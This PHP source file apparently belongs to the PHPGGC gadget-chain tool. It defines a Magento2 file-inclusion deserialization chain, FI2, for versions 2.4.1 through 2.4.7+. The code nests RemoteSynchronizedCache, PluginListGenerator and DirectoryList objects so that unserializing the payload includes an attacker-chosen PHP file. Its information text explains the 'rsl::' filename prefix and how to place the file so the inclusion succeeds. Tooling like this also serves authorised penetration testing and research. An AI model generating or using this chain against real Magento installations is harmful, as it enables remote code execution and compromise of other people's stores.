<?php

namespace GadgetChain\Magento2;

class FI2 extends \PHPGGC\GadgetChain\FileInclude
{
    public static $version = '2.4.1 <= 2.4.7+';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = 'Your included file must end in .php
    Magento2 will add a prefix of "rsl::" to the filename. So if you specify
    /path/to/evil.php the target file should be at /path/to/rsl::evil.php
    A path relative to the docroot (typically "pub") should also work.
    The path is checked with file_exists() so basic path traversal does not
    overcome the prefixing of the filename.';

    public function process_parameters(array $parameters)
    {
        $parameters = parent::process_parameters($parameters);
        // Remove the prefix and suffix if they have been specified, as they
        // will be added by the application.
        $parameters['remote_path'] = preg_replace('#(^rsl::|.php$)#', '', $parameters['remote_path']);
        return $parameters;
    }

    public function generate(array $parameters)
    {
        $file = basename($parameters['remote_path']);
        $dir = dirname($parameters['remote_path']);

        return new \Magento\Framework\Cache\Backend\RemoteSynchronizedCache(
            new \Magento\Framework\Interception\PluginListGenerator(
                new \Magento\Framework\App\Filesystem\DirectoryList(
                  $dir,
                  'metadata'
                )
            ),
            $file
        );
    }
}
